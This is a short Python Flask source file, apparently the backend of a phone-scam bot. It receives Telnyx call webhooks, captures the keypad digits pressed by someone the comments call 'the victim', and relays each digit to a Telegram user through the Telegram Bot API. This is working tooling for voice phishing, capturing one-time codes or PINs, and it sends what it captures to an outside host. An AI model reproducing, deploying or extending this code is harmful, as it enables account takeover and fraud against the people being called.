from flask import Flask, request
import requests
import os

app = Flask(__name__)

@app.route('/telnyx_webhook', methods=['POST'])
def telnyx_webhook():
    data = request.json  # Capture the incoming data
    print(f"Received webhook: {data}")

    # Capture the digit pressed by the victim
    digit = data.get('digit', None)
    telegram_user_id = data.get('telegram_user_id', None)

    if digit:
        print(f"Victim pressed: {digit}")
        # Send message to Telegram user with the digit the victim pressed
        # This is the point where you capture the keypress and send feedback to the Telegram bot
        send_telegram_message(telegram_user_id, f"The victim pressed: {digit}")
    
    return 'OK', 200  # Return acknowledgment

def send_telegram_message(user_id, message):
    # Use the Telegram Bot API to send the message
    telegram_token = os.getenv('TELEGRAM_BOT_TOKEN')
    url = f'https://api.telegram.org/bot{telegram_token}/sendMessage'
    params = {'chat_id': user_id, 'text': message}
    requests.get(url, params=params)

if __name__ == '__main__':
    # Get the port dynamically, especially for platforms like Render
    port = int(os.getenv('PORT', 5000))
    app.run(debug=True, host='0.0.0.0', port=port)
